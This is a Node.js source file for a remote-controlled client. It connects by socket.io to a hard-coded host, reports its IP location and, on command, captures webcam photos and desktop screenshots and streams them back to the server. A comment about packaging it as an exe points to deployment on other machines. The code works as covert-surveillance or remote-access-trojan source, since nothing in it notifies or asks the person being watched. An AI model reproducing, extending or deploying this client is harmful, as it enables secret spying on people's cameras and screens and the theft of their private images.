var io = require('socket.io-client');
var ss = require('socket.io-stream');
var fs = require('fs');
var nodeWebcam = require('node-webcam');
const { exec } = require('child_process');
var screenshot = require('screenshot-desktop');
const os = require('os');
var ipInfo = require('ipinfo');
var HOST = '192.168.0.14';
var PORT = 3000;

ipInfo(function(err, cLoc) {
    console.log(err || cLoc);
});

// Webcam default options
var opts = {
    width: 1280,
    height: 720,
    quality: 100,
    delay: 0,
    saveShots: true,
    output: "jpeg",
    device: false,
    callbackReturn: "location",
    verbose: true
};

function send_file(socket, filename, command) {
    var stream = ss.createStream();
    var pic_path = __dirname + '/' + filename;

    ss(socket).emit(command, stream, {name: pic_path});
    fs.createReadStream(pic_path).pipe(stream);
}

/* Package these variables in exe */
const DEVICE_ID = 1; // This should be sent too
const APP_ID = '001';
const USER = 'a';
/*********************************/

var socket = io.connect('http://' + HOST + ':' + PORT);
    
var platform = os.platform();

socket.on('connect', function () {
    socket.emit('authenticate', {app_id: APP_ID, device_id: DEVICE_ID});
    
    //TODO: stop client from sending other commands until authenticated and 
    // until asked for commands 
    
    
    socket.on('take_webcam_picture', function() {
        
        if (platform == 'linux') {
            // Create webcam instance 
            var webcam = nodeWebcam.create(opts);

            // Save picture as 'webcamPicture' on client
            webcam.capture('webcamPicture', function(error, data) {
                if(error) {
                    socket.emit('client_error', error);
                }
            });
            
            // Clear webcam cache
            webcam.clear();
            
            // Wait 3s for picture to save onto client's computer
            setTimeout(function() { 
                send_file(socket, 'webcamPicture.jpg', 'send_webcam_picture'); 
            }, 3000);
            
        } else {
            socket.emit('client_error', {error:'Webcam feature not yet supported!'});
        }
    });
    
    //TODO: Store photo in a "generated_files" dir
    socket.on('take_screenshot', function() {
        if (platform == 'linux') {
            exec('gnome-screenshot -f screenshot.jpg', (err, stdout, stderr) => {
                if (err) {
                    socket.emit('client_error', err);
                }
            });
            
        } else if (platform == 'win32') {
            screenshot({filename: 'screenshot.jpg'}).then((imgPath) => {
            }).catch((err) => {
                socket.emit('client_error', err);
            });
        }
        
        // Wait 3s for picture to save onto client's computer
        setTimeout(function() { 
            send_file(socket, 'screenshot.jpg', 'send_screenshot'); 
        }, 3000);
      
    });
        
    //emit password and/or appId over TLS to prove its truly the right node
    //server will take note of IP and save it. 
    
});